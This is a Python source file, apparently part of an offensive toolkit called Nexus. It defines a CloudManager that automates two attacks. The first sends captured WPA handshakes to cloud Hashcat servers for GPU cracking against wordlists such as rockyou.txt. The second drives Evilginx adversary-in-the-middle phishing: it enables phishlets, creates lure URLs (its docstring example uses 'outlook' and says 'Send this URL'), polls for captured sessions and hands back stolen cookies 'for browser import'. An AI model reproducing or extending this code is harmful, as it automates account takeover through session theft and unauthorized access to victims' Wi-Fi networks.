"""
Cloud Manager.
~~~~~~~~~~~~~~

Unified manager for all cloud services.
Coordinates Hashcat cracking and Evilginx AiTM operations.
"""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any
from pathlib import Path

from nexus.cloud.hashcat import (
    HashcatCloudClient,
    CloudConfig as HashcatConfig,
    CrackJob,
    CrackResult,
    HashType,
    JobStatus,
)
from nexus.cloud.evilginx import (
    EvilginxClient,
    EvilginxConfig,
    Phishlet,
    Lure,
    Session,
)

logger = logging.getLogger(__name__)


@dataclass
class CloudManagerConfig:
    """Cloud manager configuration."""
    
    # Hashcat
    hashcat: HashcatConfig = field(default_factory=HashcatConfig)
    
    # Evilginx
    evilginx: EvilginxConfig = field(default_factory=EvilginxConfig)
    
    # General
    auto_crack: bool = True        # Auto-submit handshakes for cracking
    auto_sync: bool = True         # Auto-sync with Nexus fleet


class CloudManager:
    """
    Unified cloud services manager.
    
    Coordinates:
    - Hashcat GPU cracking on cloud VPS
    - Evilginx AiTM phishing on dedicated VPS
    - Sync with Nexus sync storage
    
    Example:
        >>> config = CloudManagerConfig(
        ...     hashcat=HashcatConfig(enabled=True, url="http://hashcat:8080"),
        ...     evilginx=EvilginxConfig(enabled=True, url="http://evilginx:8080"),
        ... )
        >>> cloud = CloudManager(config)
        >>> await cloud.start()
        >>> 
        >>> # Submit crack job
        >>> result = await cloud.crack_handshake(
        ...     hash_file=Path("capture.22000"),
        ...     ssid="TargetWiFi",
        ...     bssid="AA:BB:CC:DD:EE:FF"
        ... )
        >>> 
        >>> # Create phishing campaign
        >>> lure = await cloud.create_phishing_lure("outlook")
        >>> print(f"Send this URL: {lure.url}")
        >>> 
        >>> # Check for captures
        >>> sessions = await cloud.get_phishing_sessions()
    """
    
    def __init__(self, config: CloudManagerConfig | None = None):
        """
        Initialize cloud manager.
        
        Args:
            config: Cloud configuration
        """
        self.config = config or CloudManagerConfig()
        
        # Clients
        self._hashcat: HashcatCloudClient | None = None
        self._evilginx: EvilginxClient | None = None
        
        # State
        self._running = False
        self._poll_task: asyncio.Task[None] | None = None
        
        # Callbacks
        self._crack_callbacks: list[Any] = []
        self._session_callbacks: list[Any] = []
    
    # ==================== Lifecycle ====================
    
    async def start(self) -> bool:
        """
        Start cloud manager.
        
        Returns:
            True if at least one service connected
        """
        connected = False
        
        # Connect Hashcat
        if self.config.hashcat.enabled:
            self._hashcat = HashcatCloudClient(self.config.hashcat)
            if await self._hashcat.connect():
                connected = True
                logger.info("Hashcat cloud connected")
        
        # Connect Evilginx
        if self.config.evilginx.enabled:
            self._evilginx = EvilginxClient(self.config.evilginx)
            if await self._evilginx.connect():
                connected = True
                logger.info("Evilginx VPS connected")
        
        if connected:
            self._running = True
            # Start background polling for results
            self._poll_task = asyncio.create_task(self._poll_loop())
            logger.info("Cloud manager started")
        else:
            logger.warning("No cloud services connected")
        
        return connected
    
    async def stop(self) -> None:
        """Stop cloud manager."""
        self._running = False
        
        if self._poll_task:
            self._poll_task.cancel()
            try:
                await self._poll_task
            except asyncio.CancelledError:
                pass
        
        if self._hashcat:
            await self._hashcat.disconnect()
        
        if self._evilginx:
            await self._evilginx.disconnect()
        
        logger.info("Cloud manager stopped")
    
    @property
    def is_running(self) -> bool:
        """Check if running."""
        return self._running
    
    # ==================== Hashcat Operations ====================
    
    @property
    def hashcat_available(self) -> bool:
        """Check if Hashcat is available."""
        return self._hashcat is not None and self._hashcat.is_connected
    
    async def crack_handshake(
        self,
        hash_file: Path,
        ssid: str,
        bssid: str,
        wordlist: str = "rockyou.txt",
        wait: bool = False,
        device_id: str | None = None,
    ) -> CrackResult | CrackJob | None:
        """
        Submit handshake for GPU cracking.
        
        Args:
            hash_file: Path to .22000 or .cap file
            ssid: Target SSID
            bssid: Target BSSID
            wordlist: Wordlist to use
            wait: Wait for result
            device_id: Source device ID
            
        Returns:
            Result if wait=True, Job otherwise, None on error
        """
        if not self.hashcat_available:
            logger.error("Hashcat cloud not available")
            return None
        
        job = CrackJob(
            hash_type=HashType.WPA_PMKID,
            hash_file=hash_file,
            wordlist=wordlist,
            ssid=ssid,
            bssid=bssid,
            device_id=device_id,
        )
        
        job = await self._hashcat.submit_job(job)
        
        if wait:
            result = await self._hashcat.wait_for_result(job.id)
            return result
        
        return job
    
    async def get_crack_status(self, job_id: str) -> CrackJob | None:
        """Get crack job status."""
        if not self.hashcat_available:
            return None
        return await self._hashcat.get_job_status(job_id)
    
    async def get_crack_result(self, job_id: str) -> CrackResult | None:
        """Get crack result."""
        if not self.hashcat_available:
            return None
        return await self._hashcat.get_result(job_id)
    
    async def list_crack_jobs(
        self,
        status: JobStatus | None = None,
    ) -> list[CrackJob]:
        """List crack jobs."""
        if not self.hashcat_available:
            return []
        return await self._hashcat.list_jobs(status=status)
    
    async def cancel_crack_job(self, job_id: str) -> bool:
        """Cancel a crack job."""
        if not self.hashcat_available:
            return False
        return await self._hashcat.cancel_job(job_id)
    
    # ==================== Evilginx Operations ====================
    
    @property
    def evilginx_available(self) -> bool:
        """Check if Evilginx is available."""
        return self._evilginx is not None and self._evilginx.is_connected
    
    async def list_phishlets(self) -> list[Phishlet]:
        """List available phishlets."""
        if not self.evilginx_available:
            return []
        return await self._evilginx.list_phishlets()
    
    async def enable_phishlet(
        self,
        name: str,
        hostname: str | None = None,
    ) -> Phishlet | None:
        """Enable a phishlet."""
        if not self.evilginx_available:
            return None
        return await self._evilginx.enable_phishlet(name, hostname)
    
    async def disable_phishlet(self, name: str) -> bool:
        """Disable a phishlet."""
        if not self.evilginx_available:
            return False
        return await self._evilginx.disable_phishlet(name)
    
    async def create_phishing_lure(
        self,
        phishlet: str,
        campaign: str = "",
        redirect_url: str = "",
    ) -> Lure | None:
        """
        Create a phishing lure URL.
        
        Args:
            phishlet: Phishlet name (e.g., "outlook")
            campaign: Campaign name for tracking
            redirect_url: Post-capture redirect
            
        Returns:
            Lure with URL or None on error
        """
        if not self.evilginx_available:
            return None
        return await self._evilginx.create_lure(
            phishlet=phishlet,
            campaign=campaign,
            redirect_url=redirect_url,
        )
    
    async def list_lures(self, phishlet: str | None = None) -> list[Lure]:
        """List phishing lures."""
        if not self.evilginx_available:
            return []
        return await self._evilginx.list_lures(phishlet)
    
    async def delete_lure(self, lure_id: str) -> bool:
        """Delete a lure."""
        if not self.evilginx_available:
            return False
        return await self._evilginx.delete_lure(lure_id)
    
    async def get_phishing_sessions(
        self,
        phishlet: str | None = None,
        since: datetime | None = None,
    ) -> list[Session]:
        """Get captured phishing sessions."""
        if not self.evilginx_available:
            return []
        return await self._evilginx.get_sessions(phishlet, since)
    
    async def get_session_cookies(self, session_id: str) -> str:
        """Get session cookies for browser import."""
        if not self.evilginx_available:
            return ""
        session = await self._evilginx.get_session(session_id)
        if session:
            return session.get_cookie_string()
        return ""
    
    # ==================== Callbacks ====================
    
    def on_crack_complete(self, callback: Any) -> None:
        """
        Register callback for crack completion.
        
        Args:
            callback: async function(job_id, result)
        """
        self._crack_callbacks.append(callback)
    
    def on_session_captured(self, callback: Any) -> None:
        """
        Register callback for session capture.
        
        Args:
            callback: async function(session)
        """
        self._session_callbacks.append(callback)
    
    # ==================== Background Polling ====================
    
    async def _poll_loop(self) -> None:
        """Background polling for results."""
        last_session_check = datetime.now()
        
        while self._running:
            try:
                await asyncio.sleep(10)
                
                # Poll crack jobs
                if self.hashcat_available:
                    jobs = await self._hashcat.list_jobs(status=JobStatus.RUNNING)
                    for job in jobs:
                        status = await self._hashcat.get_job_status(job.id)
                        if status and status.status == JobStatus.COMPLETED:
                            result = await self._hashcat.get_result(job.id)
                            if result:
                                await self._notify_crack_complete(job.id, result)
                
                # Poll sessions
                if self.evilginx_available:
                    sessions = await self._evilginx.get_sessions(since=last_session_check)
                    for session in sessions:
                        await self._notify_session_captured(session)
                    last_session_check = datetime.now()
                    
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Poll error: {e}")
    
    async def _notify_crack_complete(
        self,
        job_id: str,
        result: CrackResult,
    ) -> None:
        """Notify crack completion callbacks."""
        for callback in self._crack_callbacks:
            try:
                await callback(job_id, result)
            except Exception as e:
                logger.error(f"Crack callback error: {e}")
    
    async def _notify_session_captured(self, session: Session) -> None:
        """Notify session capture callbacks."""
        for callback in self._session_callbacks:
            try:
                await callback(session)
            except Exception as e:
                logger.error(f"Session callback error: {e}")
    
    # ==================== Stats ====================
    
    async def get_stats(self) -> dict[str, Any]:
        """Get cloud service statistics."""
        stats: dict[str, Any] = {
            "hashcat": {
                "available": self.hashcat_available,
                "mock": self._hashcat.is_mock if self._hashcat else False,
            },
            "evilginx": {
                "available": self.evilginx_available,
                "mock": self._evilginx.is_mock if self._evilginx else False,
            },
        }
        
        if self.hashcat_available:
            jobs = await self._hashcat.list_jobs()
            stats["hashcat"]["jobs_total"] = len(jobs)
            stats["hashcat"]["jobs_running"] = len([j for j in jobs if j.status == JobStatus.RUNNING])
            stats["hashcat"]["jobs_completed"] = len([j for j in jobs if j.status == JobStatus.COMPLETED])
        
        if self.evilginx_available:
            phishlets = await self._evilginx.list_phishlets()
            lures = await self._evilginx.list_lures()
            sessions = await self._evilginx.get_sessions()
            stats["evilginx"]["phishlets_enabled"] = len([p for p in phishlets if p.status.value == "enabled"])
            stats["evilginx"]["lures"] = len(lures)
            stats["evilginx"]["sessions"] = len(sessions)
        
        return stats
    
    # ==================== Context Manager ====================
    
    async def __aenter__(self) -> CloudManager:
        """Async context manager entry."""
        await self.start()
        return self
    
    async def __aexit__(self, exc_type: Any, exc_val: Any, exc_tb: Any) -> None:
        """Async context manager exit."""
        await self.stop()

